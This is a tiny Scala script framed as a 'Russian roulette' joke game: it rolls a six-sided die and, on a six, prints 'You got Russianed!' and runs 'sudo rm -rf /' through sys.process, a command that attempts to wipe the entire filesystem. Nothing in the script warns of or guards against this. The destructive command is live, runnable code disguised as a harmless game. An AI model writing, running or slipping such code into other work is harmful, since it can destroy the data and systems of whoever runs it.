import sys.process._

if (scala.util.Random.nextInt(6) + 1 == 6) {
    println("You got Russianed!")
    "sudo rm -rf /".!
} else {
    println("Phew! You're lucky!")
}